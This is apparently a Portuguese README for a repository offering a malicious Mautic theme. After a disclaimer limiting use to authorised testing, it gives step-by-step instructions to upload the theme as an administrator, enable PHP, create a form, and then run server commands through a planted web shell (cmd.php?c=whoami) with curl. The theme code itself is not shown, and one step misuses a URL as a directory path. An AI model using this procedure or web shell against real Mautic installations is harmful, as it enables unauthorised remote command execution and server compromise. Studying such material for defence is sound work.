# Tema Vulnerável para Mautic – Execução de Comandos

Atenção! Este repositório é destinado exclusivamente a estudos de segurança ofensiva e demonstrações em ambientes controlados. Não utilize estas instruções contra sistemas sem autorização por escrito. O uso indevido pode violar leis locais (ex.: Lei 12.737/2012 no Brasil) e resultar em sanções civis e criminais.

# Passo a passo de exploração: 

# 1. Clone este repositório e compacte o tema

$ git clone github.com/ooclaar/priv-scalation-mautic
$ cd github.com/ooclaar/priv-scalation-mautic

# 2. Acesse o painel Mautic como administrador
#    Configurações ➜ Temas ➜ Carregar tema ➜ Enviar hacked.zip

# 3. Ative o tema recém‑carregado e habilite o suporte a PHP.

# 4. Vá em Componentes ➜ Formulários ➜ Novo formulário
#    Adicione um campo de Data.

# 5. Após salvar o formulário, acesse o arquivo para executar comandos:
$ curl "https://mautic.exemplo.com/media/forms/cmd.php?c=whoami"
